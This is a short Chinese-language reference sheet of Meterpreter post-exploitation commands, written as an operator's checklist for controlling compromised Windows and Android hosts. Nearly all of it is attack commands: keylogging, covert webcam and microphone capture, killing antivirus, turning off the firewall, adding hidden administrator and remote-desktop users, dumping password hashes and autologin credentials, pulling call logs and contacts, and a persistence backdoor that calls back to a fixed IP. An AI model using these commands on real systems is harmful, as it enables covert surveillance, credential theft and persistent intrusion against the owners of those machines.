#Meterpreter

---

进程列表

getuid 获取系统ID以及计算机名称

kill 中止进程

getpid 获取当前进程标识符

键盘记录

keyscan_start 开启按键记录会话

keyscan_stop 终止按键记录会话

keyscan_dump 转储从被攻击主机捕获到的按键

会话

enumdesktops 列举所有可访问到的桌面和工作站

getdesktop 获取当前meterpreter桌面

setdesktop 变更meterpreter当前桌面

摄像头命令

webcam_list 列举系统中所有的摄像头

webcam_snap 捕获被攻击主机的快照

record_mic 从主机的默认麦克风中记录环境声音

---

keyscan_start 打开纪录总体目标服务器的键盘输入

keyscan_dump 輸出捕获到的总体目标键盘输入空格符信息内容

keyscan_stop 终止键盘记录

run vnc 打开实时监控界面

webcam_stream 打开监控摄像头

Webscan_stream //摄像头视频获取；

Webscan_chat //查看摄像头接口；

migrate 616 关掉另一方服务器防火墙

screenshot 手机截图

Run getgui -e //开启远程桌面；

Run getgui -u cmdback -p 123123 //添加用户

Run getgui -f 4446 -e //将目标主机上面的3389端口转发到4446

netsh advfirewall set allprofiles state off //关闭防火墙

Run post/windows/gather/checkvm //查看目标主机是否为虚机；

run post/windows/gather/enum_applications //获取目标主机安装软件信息；

Run post/windows/gather/enum_patches //查看目标主机的补丁信息；

run post/windows/gather/enum_domain //查找目标主机域控。我本地没有域控；

run post/windows/manage/killav //关闭杀毒软件；

run post/windows/manage/enable_rdp //开启3389远程桌面；

run post/windows/gather/enum_logged_on_users //列举当前登陆过主机的用户；

run post/windows/gather/credentials/windows_autologin //抓取自动登陆的用户名和密码；

run post/windows/manage/enable_rdp username=xxx password=xxx //添加远程桌面的用户(同时也会将该用户添加到管理员组)

---

权限维持 ：

Persistence模块

Run persistence -h //查看帮助信息；

run persistence -U -i 5 -p 5555 -r 192.168.205.148

-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；

-i：设置反向连接间隔时间，单位为秒；

-p：设置反向连接的端口号；

-r：设置反向连接的ip地址。

注入进程　migrate 

上传文件  　upload　　　　　　　　　　   　
下载文件　　 download 

查看会话  sessions -l

获取最高权限  sysinfo getsystem 

密码hash 　　 hashdump  　　　　　　　　
  　　　　　　　　　　　　　 
搜索 search -f *.jpg

打开前置或后置摄像头webcam_stream -i 1/2 　

检测root　　　check_root

下载电话记录         dump_calllog

下载信息记录       dump_contacts

定位，需要下载谷歌地图       geolocate 


